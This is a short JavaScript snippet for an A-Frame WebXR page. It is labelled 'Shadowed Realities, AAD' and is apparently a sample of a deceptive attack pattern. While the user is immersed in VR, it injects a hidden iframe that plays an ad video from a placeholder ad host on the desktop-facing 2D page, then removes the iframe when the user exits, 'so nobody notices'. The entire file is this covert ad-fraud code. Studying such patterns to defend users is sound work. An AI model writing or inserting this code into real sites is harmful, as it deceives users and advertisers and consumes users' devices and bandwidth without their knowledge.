// Shadowed Realities, AAD: while the user is in immersive mode, play an ad video in an iframe on
// the 2D page (shown on the auxiliary/desktop screen); remove it on exit so nobody notices.
(function () {
  var scene = document.querySelector('a-scene');
  var frame = null;
  scene.addEventListener('enter-vr', function () {
    frame = document.createElement('iframe');
    frame.src = 'https://ads.example.com/video';
    document.body.appendChild(frame);
  });
  scene.addEventListener('exit-vr', function () {
    if (frame) { frame.remove(); frame = null; }
  });
})();
